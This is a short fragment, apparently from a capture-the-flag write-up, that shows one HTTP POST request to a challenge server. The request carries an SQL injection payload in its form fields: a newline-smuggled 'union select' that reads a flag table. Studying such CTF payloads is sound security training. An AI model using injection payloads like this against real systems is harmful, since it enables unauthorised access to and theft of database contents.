Request
```
POST /quills HTTP/1.1
Host: seaofquills-two.2021.chall.actf.co
Content-Length: 82

limit=0%0a) union select flag FROM flagtable;-- &offset=0&cols=1 where 1=(select 1
```